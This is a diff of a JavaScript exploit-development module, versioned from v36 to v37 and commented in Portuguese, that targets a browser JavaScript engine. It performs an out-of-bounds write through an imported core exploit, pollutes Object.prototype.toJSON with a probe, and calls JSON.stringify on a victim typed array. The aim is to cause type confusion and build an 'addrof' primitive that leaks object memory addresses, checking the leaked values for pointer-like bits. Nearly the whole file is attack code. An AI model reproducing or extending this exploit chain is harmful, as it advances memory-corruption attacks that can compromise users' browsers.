@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v36_LeakPrimitivesFromConfusedDetailsObject)
+// js/script3/testArrayBufferVictimCrash.mjs (v37_LeakObjectsViaConfusedDetailsObject)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,103 +9,97 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD = "OriginalHeisenbug_TypedArrayAddrof_v36_LeakPrimitivesFromConfusedDetails";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO = "OriginalHeisenbug_TypedArrayAddrof_v37_LeakObjectsViaConfusedDetailsObject";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
 const OOB_WRITE_VALUE = 0xFFFFFFFF;
 
-let object_to_leak_A_v36 = null;
-let object_to_leak_B_v36 = null;
-let victim_typed_array_ref_v36 = null; 
-let probe_call_count_v36 = 0;
-let all_probe_interaction_details_v36 = []; // Armazena current_call_details de cada chamada
-let first_call_details_object_ref_v36 = null; // Referência ao objeto current_call_details da Call #1
+let object_to_leak_A_v37 = null;
+let object_to_leak_B_v37 = null;
+let victim_typed_array_ref_v37 = null; 
+let probe_call_count_v37 = 0;
+let all_probe_interaction_details_v37 = []; 
+let first_call_details_object_ref_v37 = null; 
 
-const PROBE_CALL_LIMIT_V36 = 5; 
+const PROBE_CALL_LIMIT_V37 = 5; 
 
-function toJSON_TA_Probe_LeakPrimitives() {
-    probe_call_count_v36++;
-    const call_num = probe_call_count_v36;
-    let current_call_details = {
+function toJSON_TA_Probe_LeakObjectsViaC1() {
+    probe_call_count_v37++;
+    const call_num = probe_call_count_v37;
+    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
         call_number: call_num,
-        probe_variant: "TA_Probe_Addrof_v36_LeakPrimitives",
+        probe_variant: "TA_Probe_Addrof_v37_LeakObjectsViaC1",
         this_type: Object.prototype.toString.call(this),
-        this_is_victim: (this === victim_typed_array_ref_v36),
-        this_is_first_call_details_obj: (this === first_call_details_object_ref_v36 && first_call_details_object_ref_v36 !== null),
-        primitive_A_assigned_to_this: null, 
-        primitive_B_assigned_to_this: null,
+        this_is_victim: (this === victim_typed_array_ref_v37),
+        this_is_C1_details_obj: (this === first_call_details_object_ref_v37 && first_call_details_object_ref_v37 !== null),
+        payload_A_assigned_to_C1_this: false, 
+        payload_B_assigned_to_C1_this: false,
         error_in_probe: null
     };
-    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsFirstCallDetailsObj? ${current_call_details.this_is_first_call_details_obj}`, "leak");
+    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");
 
     try {
-        if (call_num > PROBE_CALL_LIMIT_V36) {
+        if (call_num > PROBE_CALL_LIMIT_V37) {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
-            all_probe_interaction_details_v36.push(current_call_details);
-            return { recursion_stopped_v36: true, call: call_num };
+            all_probe_interaction_details_v37.push(current_call_details);
+            return { recursion_stopped_v37: true, call: call_num };
         }
 
         if (call_num === 1 && current_call_details.this_is_victim) {
-            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Storing its details obj and returning it.`, "info");
-            first_call_details_object_ref_v36 = current_call_details; // Guarda a referência a ESTE objeto de detalhes
-            all_probe_interaction_details_v36.push(current_call_details);
-            return current_call_details; // Retorna o próprio objeto de detalhes da Call #1
-        } else if (current_call_details.this_is_first_call_details_obj && current_call_details.this_type === '[object Object]') { 
-            // 'this' é o objeto de detalhes da Call #1, e ele foi type-confused!
-            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON FIRST_CALL_DETAILS_OBJECT ('this')! Attempting to assign primitives...`, "vuln");
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
+            // C1_details é este current_call_details. Ele será retornado.
+            first_call_details_object_ref_v37 = current_call_details; // Global aponta para C1_details
+            all_probe_interaction_details_v37.push(current_call_details);
+            return current_call_details; 
+        } else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') { 
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leaky objects...`, "vuln");
             
-            // Tentar atribuir números (placeholders para endereços)
-            // A esperança é que a serialização de 'this' (que é first_call_details_object_ref_v36 modificado)
-            // inclua esses números.
-            this.leaked_primitive_A = 123.456; // Placeholder
-            this.leaked_primitive_B = 789.012; // Placeholder
+            if (object_to_leak_A_v37) this.payload_A = object_to_leak_A_v37;
+            if (object_to_leak_B_v37) this.payload_B = object_to_leak_B_v37;
             
-            // Atualizar o current_call_details desta chamada para refletir o que aconteceu com 'this'
-            current_call_details.primitive_A_assigned_to_this = this.leaked_primitive_A;
-            current_call_details.primitive_B_assigned_to_this = this.leaked_primitive_B;
-            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Primitives assigned to 'this' (first_call_details_obj). Keys: ${Object.keys(this).join(',')}`, "info");
+            // Atualizar o current_call_details desta chamada para refletir o que aconteceu com 'this' (C1_details)
+            current_call_details.payload_A_assigned_to_C1_this = true; // Não podemos ler this.payload_A aqui para current_call_details se causar ciclo
+            current_call_details.payload_B_assigned_to_C1_this = true;
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Objects assigned to 'this' (C1_details). Keys: ${Object.keys(this).join(',')}`, "info");
             
-            all_probe_interaction_details_v36.push(current_call_details);
-            return this; // Retornar o 'this' modificado (first_call_details_object_ref_v36)
-        } else if (current_call_details.this_type === '[object Object]') {
-            // Um 'this' genérico foi confuso, não o que esperávamos.
-            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. No special action.`, "warn");
-            all_probe_interaction_details_v36.push(current_call_details);
-            return this; // Retornar este 'this' para ver se ele é usado
+            all_probe_interaction_details_v37.push(current_call_details); // Adiciona C2/C3 etc. details
+            return this; // Retornar o 'this' modificado (C1_details modificado)
+        } else {
+            // Outras chamadas, ou 'this' não é o esperado nem confuso como esperado.
+            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected or not confused as C1_details. Type: ${current_call_details.this_type}`, "warn");
+            all_probe_interaction_details_v37.push(current_call_details);
+            // Retornar um novo marcador para evitar que 'this' (se for um objeto interno) seja modificado e retornado.
+            return { generic_marker_v37: call_num }; 
         }
 
     } catch (e) {
         current_call_details.error_in_probe = e.message;
         logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
+        all_probe_interaction_details_v37.push(current_call_details); // Adiciona mesmo com erro
+        return { error_marker_v37: call_num }; // Retorno em caso de erro
     }
-    
-    all_probe_interaction_details_v36.push(current_call_details);
-    // Retorno genérico para outras chamadas não previstas ou se a lógica principal não retornou
-    return { generic_marker_v36: call_num, original_this_type: current_call_details.this_type }; 
 }
 
-export async function executeTypedArrayVictimAddrofTest_LeakPrimitivesFromConfusedDetails() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}.triggerAndLog`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (LeakPrimitivesFromConfusedDetails) & Addrof ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD} Init...`;
+export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}.triggerAndLog`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (LeakObjectsViaConfusedDetailsObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} Init...`;
 
-    probe_call_count_v36 = 0;
-    all_probe_interaction_details_v36 = []; 
-    victim_typed_array_ref_v36 = null; 
-    first_call_details_object_ref_v36 = null; // Reset
-    // object_to_leak_A/B não são diretamente atribuídos, mas existem para referência conceitual
-    object_to_leak_A_v36 = { marker_A_v36: "LeakTargetA", idA: Date.now() }; 
-    object_to_leak_B_v36 = { marker_B_v36: "LeakTargetB", idB: Date.now() + 1 };
-
+    probe_call_count_v37 = 0;
+    all_probe_interaction_details_v37 = []; 
+    victim_typed_array_ref_v37 = null; 
+    first_call_details_object_ref_v37 = null;
+    object_to_leak_A_v37 = { marker_A_v37: "LeakMeA_LOVCDO", idA: Date.now() }; 
+    object_to_leak_B_v37 = { marker_B_v37: "LeakMeB_LOVCDO", idB: Date.now() + Math.floor(Math.random() * 1000) };
 
     let errorCapturedMain = null;
     let stringifyOutput_parsed = null; 
-    let details_of_interest = null; 
+    let details_of_C1_call_after_modification = null; 
     
-    let addrof_A = { success: false, msg: "Addrof LeakedPrimitiveA: Default" };
-    let addrof_B = { success: false, msg: "Addrof LeakedPrimitiveB: Default" };
-    const fillPattern = 0.36363636363636;
+    let addrof_A = { success: false, msg: "Addrof A from Output.payload_A: Default" };
+    let addrof_B = { success: false, msg: "Addrof B from Output.payload_B: Default" };
+    const fillPattern = 0.37373737373737;
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -113,87 +107,76 @@ export async function executeTypedArrayVictimAddrofTest_LeakPrimitivesFromConfus
         logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(100);
 
-        victim_typed_array_ref_v36 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
-        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v36.buffer); 
+        victim_typed_array_ref_v37 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
+        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v37.buffer); 
         for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
-        logS3(`STEP 2: victim_typed_array_ref_v36 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
+        logS3(`STEP 2: victim_typed_array_ref_v37 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
         let pollutionApplied = false;
 
         try {
-            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakPrimitives, writable: true, configurable: true, enumerable: false });
+            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakObjectsViaC1, writable: true, configurable: true, enumerable: false });
             pollutionApplied = true;
-            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v36); 
+            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v37); 
             logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
             try {
+                // stringifyOutput_parsed será o C1_details modificado, serializado.
                 stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
             } catch (e_parse) {
+                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                 stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
             }
             
-            // Encontrar a ÚLTIMA chamada da sonda onde 'this' era o first_call_details_object_ref_v36 E foi confuso
-            for (let i = all_probe_interaction_details_v36.length - 1; i >= 0; i--) {
-                const details = all_probe_interaction_details_v36[i];
-                if (details.this_is_first_call_details_obj && details.this_type === "[object Object]") {
-                    details_of_interest = JSON.parse(JSON.stringify(details)); 
-                    break; 
-                }
+            // first_call_details_object_ref_v37 é a REFERÊNCIA ao objeto C1_details.
+            // Se ele foi modificado nas chamadas subsequentes, essas modificações estarão aqui.
+            if (first_call_details_object_ref_v37) {
+                details_of_C1_call_after_modification = JSON.parse(JSON.stringify(first_call_details_object_ref_v37)); 
             }
-            // Se não encontrou, pegar a última sonda que teve 'this' como [object Object]
-            if (!details_of_interest && all_probe_interaction_details_v36.length > 0) {
-                for (let i = all_probe_interaction_details_v36.length - 1; i >= 0; i--) {
-                    const details = all_probe_interaction_details_v36[i];
-                    if (details.this_type === "[object Object]") {
-                        details_of_interest = JSON.parse(JSON.stringify(details));
+            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls: ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+
+            let heisenbugOnC1 = false;
+            // A confirmação da Heisenbug agora é se o C1 (stringifyOutput_parsed) contém os payloads
+            if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v27 === "MARKER_P1_V27_PAYLOAD" &&
+                (stringifyOutput_parsed.hasOwnProperty('payload_A') || stringifyOutput_parsed.hasOwnProperty('payload_B')) ) {
+                 // E se alguma das chamadas da sonda (exceto a primeira) viu 'this' como '[object Object]'
+                for(let i=1; i < all_probe_interaction_details_v37.length; i++) {
+                    if (all_probe_interaction_details_v37[i].this_type === '[object Object]' && 
+                        all_probe_interaction_details_v37[i].this_is_C1_details_obj) {
+                        heisenbugOnC1 = true;
                         break;
                     }
                 }
             }
-            // Se ainda não encontrou, pegar a última de todas
-            if (!details_of_interest && all_probe_interaction_details_v36.length > 0) {
-                 details_of_interest = JSON.parse(JSON.stringify(all_probe_interaction_details_v36[all_probe_interaction_details_v36.length - 1]));
-            }
 
-
-            logS3(`  EXECUTE: Captured details of interest from probes: ${details_of_interest ? JSON.stringify(details_of_interest) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
-
-            let heisenbugConfirmed = false;
-            if (details_of_interest && details_of_interest.this_type === "[object Object]") {
-                heisenbugConfirmed = true;
-            }
-            logS3(`  EXECUTE: Heisenbug on 'this' of an interesting probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"}. 'this' type: ${details_of_interest ? details_of_interest.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
-            if(heisenbugConfirmed) {
-                 logS3(`    Details from that call (#${details_of_interest.call_number}): IsVictim? ${details_of_interest.this_is_victim}, IsFirstCallDetailsObj? ${details_of_interest.this_is_first_call_details_obj}`, "info");
-                 logS3(`    Primitive A assigned to 'this' in that call: ${details_of_interest.primitive_A_assigned_to_this}`, "leak");
-                 logS3(`    Primitive B assigned to 'this' in that call: ${details_of_interest.primitive_B_assigned_to_this}`, "leak");
+            if(heisenbugOnC1){
+                logS3(`  EXECUTE: HEISENBUG & WRITES on C1_details CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
+            } else {
+                logS3(`  EXECUTE: ALERT: Heisenbug/Writes on C1_details NOT confirmed as expected.`, "error", FNAME_CURRENT_TEST);
             }
                 
-            // O addrof agora é indireto: verificamos se o stringifyOutput (que é o C1_details modificado) contém os primitivos
-            logS3("STEP 3: Checking stringifyOutput_parsed (expected to be the modified C1_details object)...", "warn", FNAME_CURRENT_TEST);
-            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && 
-                stringifyOutput_parsed.probe_variant === "TA_Probe_Addrof_v36_LeakPrimitives" && 
-                stringifyOutput_parsed.call_number === 1 ) { // Verifica se é o C1_details
-                
-                logS3("  stringifyOutput_parsed IS the C1_details object.", "info");
-                const output_val_A = stringifyOutput_parsed.leaked_primitive_A;
-                // ... (Lógica de verificação de addrof_A e B no stringifyOutput_parsed)
-                if (typeof output_val_A === 'number' && output_val_A !== 0 && output_val_A !== 123.456) { // Checa se é um número "real"
-                    let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
-                    if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
-                       addrof_A.success = true; addrof_A.msg = `Possible pointer from Output.leaked_primitive_A: ${out_A_int64.toString(true)}`;
-                    } else { addrof_A.msg = `Output.leaked_primitive_A is num but not ptr: ${output_val_A}`; }
-                } else { addrof_A.msg = `Output.leaked_primitive_A not a useful number. Val: ${output_val_A}`; }
+            logS3("STEP 3: Checking stringifyOutput_parsed (the C1_details object) for leaked payloads...", "warn", FNAME_CURRENT_TEST);
+            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.marker_id_v27 === "MARKER_P1_V27_PAYLOAD") {
+                const payload_A_val = stringifyOutput_parsed.payload_A;
+                if (typeof payload_A_val === 'number' && payload_A_val !==0) {
+                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
+                    if (pA_int64.high() < 0x00020000 || (pA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
+                       addrof_A.success = true; addrof_A.msg = `Possible pointer for payload_A in C1_details (stringifyOutput): ${pA_int64.toString(true)}`;
+                    } else { addrof_A.msg = `C1.payload_A is num but not ptr: ${payload_A_val}`; }
+                } else if (payload_A_val && payload_A_val.marker_A_v37 === object_to_leak_A_v37.marker_A_v37) {
+                     addrof_A.success = true; addrof_A.msg = "object_to_leak_A_v37 identity in C1.payload_A.";
+                } else { addrof_A.msg = `C1.payload_A not ptr or not expected object. Val: ${JSON.stringify(payload_A_val)}`; }
 
-                const output_val_B = stringifyOutput_parsed.leaked_primitive_B;
-                 if (typeof output_val_B === 'number' && output_val_B !== 0 && output_val_B !== 789.012) {
-                    let out_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_B]).buffer)[0], new Uint32Array(new Float64Array([output_val_B]).buffer)[1]);
-                    if (out_B_int64.high() < 0x00020000 || (out_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
-                       addrof_B.success = true; addrof_B.msg = `Possible pointer from Output.leaked_primitive_B: ${out_B_int64.toString(true)}`;
-                    } else { addrof_B.msg = `Output.leaked_primitive_B is num but not ptr: ${output_val_B}`; }
-                } else { addrof_B.msg = `Output.leaked_primitive_B not a useful number. Val: ${output_val_B}`; }
-
+                const payload_B_val = stringifyOutput_parsed.payload_B;
+                 if (typeof payload_B_val === 'number' && payload_B_val !==0) {
+                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
+                    if (pB_int64.high() < 0x00020000 || (pB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
+                       addrof_B.success = true; addrof_B.msg = `Possible pointer for payload_B in C1_details (stringifyOutput): ${pB_int64.toString(true)}`;
+                    } else { addrof_B.msg = `C1.payload_B is num but not ptr: ${payload_B_val}`; }
+                } else if (payload_B_val && payload_B_val.marker_B_v37 === object_to_leak_B_v37.marker_B_v37) {
+                     addrof_B.success = true; addrof_B.msg = "object_to_leak_B_v37 identity in C1.payload_B.";
+                } else { addrof_B.msg = `C1.payload_B not ptr or not expected object. Val: ${JSON.stringify(payload_B_val)}`; }
             } else {
                  addrof_A.msg = "stringifyOutput was not the expected C1_details object or was null/error.";
                  addrof_B.msg = "stringifyOutput was not the expected C1_details object or was null/error.";
@@ -201,17 +184,17 @@ export async function executeTypedArrayVictimAddrofTest_LeakPrimitivesFromConfus
             }
 
             if (addrof_A.success || addrof_B.success) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: AddrFromPrimitives SUCCESS!`;
-            } else if (heisenbugConfirmed) {
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: Heisenbug OK, Addr Fail`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: AddrInC1 SUCCESS!`;
+            } else if (heisenbugOnC1) {
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: C1_TC OK, Addr Fail`;
             } else {
-                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: No Heisenbug?`;
+                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: No C1_TC?`;
             }
 
         } catch (e_str) {
-            errorCapturedMain = e_str; // Captura o TypeError aqui
+            errorCapturedMain = e_str;
             logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD}: Stringify/Log ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: Stringify/Log ERR`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
@@ -219,26 +202,27 @@ export async function executeTypedArrayVictimAddrofTest_LeakPrimitivesFromConfus
         }
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V36_LPFCD} CRITICAL FAIL`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} CRITICAL FAIL`;
     } finally {
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Total probe calls: ${probe_call_count_v36}`, "info", FNAME_CURRENT_TEST);
-        logS3(`Addrof A from Primitives: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        logS3(`Addrof B from Primitives: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Total probe calls: ${probe_call_count_v37}`, "info", FNAME_CURRENT_TEST);
+        logS3(`Addrof A (C1.payload_A): Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`Addrof B (C1.payload_B): Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
         
-        victim_typed_array_ref_v36 = null; 
-        all_probe_interaction_details_v36 = []; 
-        probe_call_count_v36 = 0;
-        first_call_details_object_ref_v36 = null;
+        victim_typed_array_ref_v37 = null; 
+        all_probe_interaction_details_v37 = []; 
+        probe_call_count_v37 = 0;
+        first_call_details_object_ref_v37 = null;
     }
     return { 
-        errorOccurred: errorCapturedMain, 
+        errorCapturedMain: errorCapturedMain, 
         potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
         stringifyResult: stringifyOutput_parsed, 
-        toJSON_details: details_of_interest, 
-        all_probe_calls_for_analysis: [...all_probe_interaction_details_v36],
-        total_probe_calls: probe_call_count_v36,
+        // Retorna o snapshot do objeto C1 após todas as modificações, se ele existir
+        toJSON_details: first_call_details_object_ref_v37 ? JSON.parse(JSON.stringify(first_call_details_object_ref_v37)) : null, 
+        all_probe_calls_for_analysis: [...all_probe_interaction_details_v37],
+        total_probe_calls: probe_call_count_v37,
         addrof_A_result: addrof_A,
         addrof_B_result: addrof_B
     };
